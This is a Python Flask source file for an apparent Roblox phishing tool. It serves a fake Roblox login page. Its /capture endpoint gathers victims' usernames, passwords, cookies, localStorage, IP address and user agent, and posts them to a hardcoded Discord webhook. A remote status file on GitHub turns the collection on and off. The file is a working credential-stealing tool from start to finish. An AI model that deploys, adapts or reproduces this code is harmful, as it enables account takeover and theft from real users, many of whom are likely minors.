import os
import json
import requests
from flask import Flask, request, render_template, jsonify
from datetime import datetime

app = Flask(__name__)

# ===== CẤU HÌNH =====
# URL RAW của file status.txt trên GitHub (THAY BẰNG LINK CỦA BẠN)
STATUS_URL = "https://raw.githubusercontent.com/your-username/auto-grabber-roblox/main/status.txt"

# Discord Webhook
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532377022137892928/DAwlZwsG3ngH2tEL2Oc7XgrXkz0xu8y4kfgzKssdb7UuTS8jVPoWB1MdxFRTT5HIv_RK"

def get_status():
    """Đọc trạng thái từ file trên GitHub"""
    try:
        r = requests.get(STATUS_URL, timeout=5)
        if r.status_code == 200:
            status = r.text.strip().lower()
            return status if status in ['start', 'stop'] else 'stop'
        else:
            return 'stop'
    except:
        return 'stop'

def send_discord(platform, data, ip, user_agent):
    embed = {
        "embeds": [{
            "title": "🎯 ROBLOX AUTO GRAB",
            "color": 0xff5500,
            "fields": [
                {"name": "Email/Username", "value": data.get('email', 'N/A'), "inline": True},
                {"name": "Password", "value": data.get('password', 'N/A'), "inline": True},
                {"name": "Cookies", "value": data.get('cookies', 'N/A')[:300] + "...", "inline": False},
                {"name": "LocalStorage", "value": json.dumps(data.get('localStorage', {}), indent=2)[:300] + "...", "inline": False},
                {"name": "IP", "value": ip, "inline": True},
                {"name": "User-Agent", "value": user_agent[:100], "inline": False},
                {"name": "Time", "value": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": False}
            ],
            "footer": {"text": "Auto Grabber - Roblox only"}
        }]
    }
    try:
        r = requests.post(DISCORD_WEBHOOK_URL, json=embed)
        if r.status_code == 204:
            print("[+] Webhook sent.")
        else:
            print(f"[-] Webhook error: {r.status_code}")
    except Exception as e:
        print(f"[-] Error: {e}")

@app.route('/')
def index():
    status = get_status()
    return render_template('index.html', status=status)

@app.route('/login/roblox')
def roblox_login():
    if get_status() != 'start':
        return "Hệ thống đang dừng. Vui lòng đổi status.txt thành 'start' trên GitHub.", 403
    return render_template('login.html', platform="roblox")

@app.route('/capture', methods=['POST'])
def capture():
    if get_status() != 'start':
        return jsonify({"error": "Hệ thống đang dừng"}), 403
    data = request.get_json()
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    send_discord('roblox', data, ip, ua)
    return jsonify({"status": "ok"})

@app.route('/success')
def success():
    return render_template('success.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
